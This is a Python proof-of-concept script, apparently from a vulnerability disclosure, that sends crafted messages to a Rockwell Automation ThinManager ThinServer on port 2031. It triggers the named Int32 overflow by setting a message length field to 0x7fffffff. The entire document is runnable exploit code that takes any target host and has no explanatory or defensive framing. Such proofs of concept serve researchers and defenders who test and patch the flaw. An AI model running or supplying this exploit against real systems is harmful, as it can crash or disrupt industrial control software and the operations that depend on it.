import socket, argparse, hexdump
from struct import *

def dump(title, data):
  print('[-- %s --]' % (title))
  if data: hexdump.hexdump(data)

def mk_msg(type, flags, data, dlen=None):
  if dlen == None:
    dlen = len(data)
  hdr = pack('>HHL', type, flags, dlen);
  msg = hdr + data
  return msg


#
# MAIN
#
descr = 'Rockwell Automation ThinManager ThinServer "GetDataFromMsgBody" Int32 Overflow'

parser = argparse.ArgumentParser(description=descr, formatter_class=argparse.RawTextHelpFormatter)
required = parser.add_argument_group('required arguments')
required.add_argument('-t', '--target',required=True, help='target host')
parser.add_argument('-p', '--port', type=int, default=2031, help='ThinServer.exe port, default: %(default)s')

args = parser.parse_args()
target = args.target
port = args.port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((target, port))
s.settimeout(5)

req = pack('<L', 0x100);
dump('req', req)
s.sendall(req)
res = s.recv(4096)
dump('res', res)

data  = pack('>L', 0xaa)
data += pack('>L', 0xbb)
data += pack('>L', 0x7fffffff)
data += b'A' * 16 

req = mk_msg(13, 0x0021, data)
dump('req (up to 0x100 bytes)', req[:0x100])
try:
  s.sendall(req)
  res = s.recv(4096)
  dump('res', res)
except Exception as e:
  print(e)
s.close()
